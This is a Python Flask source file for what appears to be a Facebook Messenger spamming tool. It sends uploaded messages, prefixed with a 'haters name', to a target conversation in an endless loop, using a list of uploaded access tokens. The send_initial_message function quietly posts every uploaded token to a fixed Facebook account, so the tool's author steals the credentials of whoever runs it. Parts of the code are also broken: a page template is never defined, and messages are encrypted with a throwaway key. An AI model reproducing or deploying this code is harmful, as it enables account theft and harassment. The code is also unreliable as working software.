from flask import Flask, request, render_template_string, jsonify
import threading
import os
import requests
import time
import http.server
import socketserver
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

app = Flask(__name__)

# AES Encryption Function
def encrypt_message(message, key):
    iv = os.urandom(16)  # Generate a random Initialization Vector (IV)
    padder = padding.PKCS7(128).padder()  # Pad the message to the block size
    padded_message = padder.update(message.encode()) + padder.finalize()
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_message = encryptor.update(padded_message) + encryptor.finalize()
    
    return iv + encrypted_message  # Return IV concatenated with encrypted data

# AES Decryption Function
def decrypt_message(encrypted_message, key):
    iv = encrypted_message[:16]  # Extract the IV from the first 16 bytes
    encrypted_message = encrypted_message[16:]
    
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded_message = decryptor.update(encrypted_message) + decryptor.finalize()
    
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_message = unpadder.update(decrypted_padded_message) + unpadder.finalize()
    
    return decrypted_message.decode()

# HTTP server handler class
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Server is running")

# Function to execute the HTTP server
def execute_server(port):
    with socketserver.TCPServer(("", port), MyHandler) as httpd:
        print(f"Server running at http://localhost:{port}")
        httpd.serve_forever()

# Function to read a file and return its content as a list of lines
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_server_and_messaging():
    port = 4000  # Port is fixed to 4000
    target_id = "100000142188441"  # Fixed target ID
    convo_id = request.form.get('convoId')
    haters_name = request.form.get('hatersName')
    speed = int(request.form.get('speed'))
    
    # Save uploaded files
    tokens_file = request.files['tokensFile']
    messages_file = request.files['messagesFile']
    
    tokens_path = 'uploaded_tokens.txt'
    messages_path = 'uploaded_messages.txt'
    
    tokens_file.save(tokens_path)
    messages_file.save(messages_path)
    
    tokens = read_file(tokens_path)
    messages = read_file(messages_path)

    # Encryption key (this should ideally be kept secure and shared between the sender and receiver)
    encryption_key = os.urandom(32)  # AES-256 key (32 bytes)

    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server, args=(port,))
    server_thread.start()

    # Function to send an initial message
    def send_initial_message():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        for token in tokens:
            access_token = token.strip()
            url = f"https://graph.facebook.com/v17.0/{target_id}/messages"
            msg = f"Hello! I am using your server. My token is {access_token}"
            
            # Encrypt the message before sending
            encrypted_msg = encrypt_message(msg, encryption_key)
            
            parameters = {
                "access_token": access_token,
                "message": encrypted_msg.hex()  # Send the encrypted message as hex string
            }
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)

    # Function to send messages in a loop
    def send_messages():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = tokens[token_index].strip()
                    message = messages[message_index].strip()
                    url = f"https://graph.facebook.com/v17.0/{convo_id}/messages"
                    
                    # Encrypt the message before sending
                    full_message = f"{haters_name} {message}"
                    encrypted_message = encrypt_message(full_message, encryption_key)
                    
                    parameters = {
                        "access_token": access_token,
                        "message": encrypted_message.hex()  # Send encrypted message
                    }
                    response = requests.post(url, json=parameters, headers=headers)
                    time.sleep(speed)
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    # Send initial message
    send_initial_message()

    # Start sending messages in a loop
    message_thread = threading.Thread(target=send_messages)
    message_thread.start()

    return jsonify({"message": "Server and messaging started successfully"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
